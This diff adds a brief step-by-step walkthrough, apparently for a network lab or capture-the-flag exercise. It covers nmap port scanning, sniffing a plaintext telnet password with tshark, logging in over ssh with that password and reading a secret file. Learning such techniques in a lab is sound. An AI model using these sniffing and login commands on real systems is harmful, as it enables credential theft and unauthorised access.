@@ -1,0 +1,5 @@
+Step 1: check ip address and interface with ifconfig at MyComputer and router
+Step 2: Scan ubuntu open port with command nmap -p 2000-3000 <ubuntu ip>
+Step 3: Since MyComputer connects directly to ubuntu (confirm this by using tcpdump: sudo tcpdump -i eth1 port <port number> -X (better looking only)), use tshark to get the password since telnet data is not encrypted: sudo tshark -i eth1 -T fields -e telnet.data port 2559
+Step 4: ssh with the password: ssh ubuntu@<ip> -p <port number>
+Step 5: cat the secret file
